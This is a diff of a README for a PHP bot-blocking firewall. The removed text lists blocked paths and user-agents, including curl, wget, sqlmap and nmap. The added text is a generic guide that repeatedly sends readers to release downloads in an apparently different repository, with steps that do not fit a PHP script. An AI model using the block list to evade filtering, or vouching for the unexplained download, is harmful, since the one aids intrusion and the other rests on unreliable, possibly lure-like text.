@@ -1,125 +1,68 @@
-# 🛡 PHP Bot Blocker — Firewall for Shared Hosting & PHP Projects
+# 🔥 PHP-Firewall-for-Shared-Hosting-And-PHP-Projects - Simplify Your Web Security
 
----
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/richardjramirez86/PHP-Firewall-for-Shared-Hosting-And-PHP-Projects/releases)
 
-## 📜 Description
+## 🚀 Getting Started
 
-**PHP Bot Blocker** is a **lightweight, self-contained firewall** for PHP projects that protects against spam traffic, vulnerability scanners, brute-force attacks, and cache-flooding bots — **without root access or complex setup**.  
+This guide will help you download and run the PHP Firewall for your shared hosting or PHP projects. This firewall is a lightweight solution that filters traffic to block harmful bots, scanners, and various attacks, all without requiring complex setups or root access.
 
-Designed for **shared hosting** and **pay-as-you-go cloud platforms** (Railway, Vercel, Render, etc.), it filters malicious requests instantly, blocks suspicious IPs, and keeps a **persistent ban list** in SQLite for 7 days.  
+## 📥 Download & Install
 
-✅ Works on PHP ≥ 5.4  
-✅ No server modules or external APIs required  
-✅ Protects both static and dynamic PHP sites  
+1. **Visit the Releases Page**  
+   Click on the link below to reach the Download page where you can get the latest version of the firewall:
 
----
+   [Download the latest version here](https://github.com/richardjramirez86/PHP-Firewall-for-Shared-Hosting-And-PHP-Projects/releases)
 
-## 🚨 The Problem
+2. **Select Your Version**  
+   On the releases page, you will see multiple versions. Look for the latest release, usually marked at the top. Click on the version you want to download.
 
-| ❌ Problem | 💥 Impact |
-|-----------|----------|
-| Bots and scanners flood your site with junk requests | Higher TTFB, lower PageSpeed score |
-| Sensitive files and CMS admin pages exposed | Risk of exploits and data leaks |
-| CDN and app cache filled with garbage | Wasted bandwidth and storage |
-| High request rates from one IP | Potential DDoS or service slowdown |
-| Pay-as-you-go hosting bills inflated | Paying for “garbage” traffic |
+3. **Download the File**  
+   Click on the download link for the file that suits your operating system. Wait for the download to finish.
 
----
+4. **Extract the File**  
+   If your download is in a ZIP file format, right-click on the file and choose “Extract All.” This will create a folder that contains the firewall files.
 
-## 🛠 How This Firewall Solves It
+5. **Upload to Your Server**  
+   Using your FTP client (like FileZilla or Cyberduck), upload the extracted files to your shared hosting server. Place them in a folder that is accessible by your web server.
 
-| ✅ Feature | 🚀 Benefit |
-|-----------|-----------|
-| Blocks bad User-Agents (scanners, scrapers, AI crawlers) | Cuts junk traffic instantly |
-| Denies access to dangerous paths/files (`wp-login.php`, `.env`, `.sql`, `.git`, etc.) | Prevents common exploit entry points |
-| Auto-bans IPs after 3 bad requests | Stops brute-force attempts |
-| Rate limiting — 10+ requests in 5 sec → ban | Mitigates flood attacks |
-| Persistent bans in SQLite (7 days) | Survives restarts without MySQL |
-| Automatic cleanup of old logs | Keeps DB small & fast |
-| Detects real IP behind Cloudflare/proxies | Avoids false bans |
+6. **Set Permissions**  
+   Ensure the firewall files have the correct permissions. You may need to set the folder permissions to 755 and the file permissions to 644 using your FTP client.
 
----
+7. **Configure the Firewall**  
+   Open the configuration file in the extracted folder. This file allows you to customize the firewall settings based on your needs. Make changes as needed, then save the file.
 
-## 📌 Why SQLite
+8. **Verify Installation**  
+   Visit your website to check if the firewall is running correctly. You should see a message indicating that the firewall is active.
 
-| 📍 Local | ⚡ Fast | 🔒 Secure | 🛠 Zero Config |
-|----------|--------|-----------|---------------|
-| No network latency | Read/write in milliseconds | Stored outside public webroot | Works out-of-the-box on PHP ≥ 5.4 |
+## 🔒 Features
 
----
+- **Traffic Filtering:** Guards against harmful bots, scanners, and unwanted traffic.
+- **Sensitive File Protection:** Blocks access to critical files to prevent unauthorized viewing.
+- **Brute Force & DDoS Protection:** Detects and halts brute-force attacks and potential DDoS threats.
+- **Persistent Bans:** Automatically bans repeated offenders using an SQLite database.
+- **Easy to Use:** No complex setup is needed, making it suitable for shared hosting environments.
 
-## ⚙️ Installation
+## 🖥️ System Requirements
 
-1. **Place files**:  
-   - `bot-blocker.php` → project root  
-   - `bot-blocker.db` → **one directory above web root**  
+- A web server with PHP 7.0 or higher.
+- Access to upload files via FTP or a similar method.
+- Support for SQLite to manage persistent bans.
+- Shared hosting or any PHP-compatible hosting environment.
 
-2. **Protect the database** — add to `.htaccess`:  
-   ```apache
-   <Files "bot-blocker.db">
-       Order allow,deny
-       Deny from all
-   </Files>
+## 📝 How It Works
 
-3. **Include in your PHP scripts** (e.g., in `index.php`):
+The PHP Firewall operates by analyzing incoming traffic to your server. It checks each request against a set of predefined rules. If a request matches the patterns of known harmful traffic (like bad bots or attempted scans), the firewall blocks it effectively. This proactive approach helps maintain the security of your application and sensitive data.
 
-   ```php
-   require_once __DIR__ . '/bot-blocker.php';
-   ```
+## 🧑‍🤝‍🧑 Community and Support
 
----
+If you encounter any issues or need assistance, feel free to reach out through the repository's Issues page. You can also check for updates and suggestions from other users.  
 
-## 🚫 What It Blocks
+Stay safe and enjoy a more secure web presence with the PHP Firewall!
 
-### Bad Paths
+## 🌱 Want to Learn More?
 
-* WordPress entry points (`wp-login.php`, `xmlrpc.php`, `wp-admin`)
-* Config/DB files (`.env`, `.sql`, `.db`, `.git`, `.svn`, `.bak`)
-* Dev files (`composer.json`, `package.json`, `node_modules`)
-* Spam `.txt` files (`ads.txt`, `humans.txt`, `security.txt`, `sitemap.xml`)
+For more information on features, potential updates, and tips on using the PHP Firewall effectively, you can refer to the documentation provided in the repository. Your feedback is valuable, so feel free to contribute with suggestions or improvements. 
 
-### Bad User-Agents
+Remember to download the latest version of the firewall using the link below:
 
-* CLI tools (`curl`, `wget`, `python`, `sqlmap`, `nmap`)
-* Vulnerability scanners (`acunetix`, `nikto`, `netsparker`)
-* Crawlers/bots (`crawler`, `scrapy`, `search`, `spider`)
-* Data miners (`Dataprovider`, `SimilarWeb`, `DataForSEO`)
-* Performance tools (`Chrome-Lighthouse`, `GTmetrix`, `WebPageTest`)
-* AI crawlers (`ClaudeBot`, `ChatGPT-User`, `PerplexityBot`)
-
----
-
-## 📈 Results You Can Expect
-
-After installing:
-
-* 🚀 Faster response times (lower TTFB)
-* 🛡 Drastically reduced bot traffic
-* 📉 Lower hosting bills on usage-based platforms
-* 🔒 Reduced attack surface
-* 🗑 Cleaner logs with only real visitor activity
-
----
-
-## 💻 Tech Stack
-
-![PHP](https://img.shields.io/badge/php-%23777BB4.svg?style=for-the-badge\&logo=php\&logoColor=white)
-![SQLite](https://img.shields.io/badge/sqlite-%23003B57.svg?style=for-the-badge\&logo=sqlite\&logoColor=white)
-![Apache](https://img.shields.io/badge/apache-%23D42029.svg?style=for-the-badge\&logo=apache\&logoColor=white)
-![Nginx](https://img.shields.io/badge/nginx-%23009639.svg?style=for-the-badge\&logo=nginx\&logoColor=white)
-![Shared Hosting](https://img.shields.io/badge/shared_hosting-%23FFA500.svg?style=for-the-badge\&logo=server\&logoColor=white)
-![Firewall](https://img.shields.io/badge/firewall-%23C41E3A.svg?style=for-the-badge\&logo=shield\&logoColor=white)
-![Cache Optimized](https://img.shields.io/badge/cache%20optimized-%23F5A623.svg?style=for-the-badge\&logo=cache\&logoColor=white)
-![Security](https://img.shields.io/badge/security-%234CAF50.svg?style=for-the-badge\&logo=security\&logoColor=white)
-![Proxy Detection](https://img.shields.io/badge/proxy%20detection-%2300BFFF.svg?style=for-the-badge\&logo=network\&logoColor=white)
-
----
-
-## 📦 License
-
-MIT — free to use and modify.
-
----
-
-### ⭐ If you find this firewall useful, **star the repository** and share it with the developer community!
-
+[Download the latest version here](https://github.com/richardjramirez86/PHP-Firewall-for-Shared-Hosting-And-PHP-Projects/releases)
